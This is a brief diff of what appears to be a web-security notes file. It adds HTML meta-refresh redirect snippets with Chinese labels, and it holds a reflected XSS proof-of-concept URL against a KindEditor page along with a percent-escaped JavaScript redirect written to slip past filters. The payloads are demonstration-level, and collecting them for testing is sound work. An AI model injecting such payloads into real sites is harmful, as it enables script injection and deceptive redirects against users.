@@ -1,3 +1,8 @@
+3秒后刷新页面:
+<meta http-equiv="Refresh" content="3" />
+3秒之后跳转页面:
+<meta http-equiv="Refresh" content="3;url=http://it.zte.com.cn" />
+
 http://localhost/kindeditor/index.php?name=<pre><script>alert('XSS');</script>by ZSL!</pre>
 
 location=unescape`%68%74%74%70%3A%2F%2F%67%6F%6F%67%6C%65%2E%63%6F%6D`
